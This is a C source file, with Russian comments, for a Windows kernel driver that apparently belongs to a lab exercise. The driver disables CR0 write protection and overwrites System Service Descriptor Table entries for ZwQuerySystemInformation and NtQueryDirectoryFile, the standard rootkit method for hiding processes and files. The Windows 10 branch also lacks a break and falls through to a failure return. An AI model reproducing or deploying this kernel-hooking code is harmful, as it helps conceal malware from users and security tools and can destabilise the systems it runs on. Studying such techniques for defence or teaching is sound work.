/****************************************************************************

    Модуль init.c

****************************************************************************/

#include <ntddk.h>
#include "process.h"
#include "files.h"

//*************************************************************
// константы



// глобальные переменные



extern SHORT *NtBuildNumber;



//*************************************************************
// предварительное объявление функций

NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath);
NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject);

VOID InsertAllHook(VOID);
VOID RemoveAllHook(VOID);

//*************************************************************
// описание функций

// функция инициализации драйвера
NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath){
	UNREFERENCED_PARAMETER(RegistryPath);
	
	NTSTATUS status = STATUS_SUCCESS;

#if DBG
    DbgPrint("Load driver %wZ\n",&DriverObject->DriverName);
#endif

	DriverObject->DriverUnload = &DriverUnload;
	//DbgBreakPoint();
	switch(*NtBuildNumber){
		case WINXP_BUILD_NUMBER:
#ifdef _M_IX86
			INIT_VARIABLES(WINXP_x86);
#else
			INIT_VARIABLES(WINXP_x64);
#endif // _
			break;
		
		case WIN7_BUILD_NUMBER:
			DbgPrint("Win7\n");
#ifdef _M_IX86
			INIT_VARIABLES(WIN7_x86);
#else
			INIT_VARIABLES(WIN7_x64);
#endif // _
			break;

		case WIN8_BUILD_NUMBER:
			DbgPrint("Win8\n");
#ifdef _M_IX86
			//INIT_VARIABLES(WIN8_1_x86);
#else
			//INIT_VARIABLES(WIN8_1_x64);
#endif // _
			break;	

		case WIN10_20H2_BUILD_NUMBER:
#ifdef _M_IX86
			//INIT_VARIABLES(WIN10_20H2_x86);
#else
			INIT_VARIABLES(WIN10_20H2_x64);
#endif // _

		default:
			return STATUS_UNSUCCESSFUL;
	}

	InsertAllHook();

    return status;
}

NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject){
	UNREFERENCED_PARAMETER(DriverObject);
	DbgPrint("Driver unload\n");
	
	//DbgBreakPoint();
	//InsertProcessEntry();
	
	RemoveAllHook();

	return STATUS_SUCCESS;
}


VOID InsertAllHook(VOID) {
	
	ULONG reg;

	reg = ClearWP();

	// BASE TASK 0
	glRealNtQuerySystemInformation =
		(ZW_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]];

	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]] = (ULONG_PTR)HookZwQuerySystemInformation;
	
	// BASE TASK 2
	glRealNtQueryDirectoryFile =
		(NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]];

	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]] = (ULONG_PTR)HookNtQueryDirectoryFile;
	
	WriteCR0(reg);

}

VOID RemoveAllHook(VOID) {
	
	ULONG reg;

	reg = ClearWP();

	// BASE TASK 0
	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]] = (ULONG_PTR)glRealNtQuerySystemInformation;

	// BASE TASK 2
	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]] = (ULONG_PTR)glRealNtQueryDirectoryFile;
	

	WriteCR0(reg);

	WaitVar(&glHookCount);
}




//-----------------------------------------------

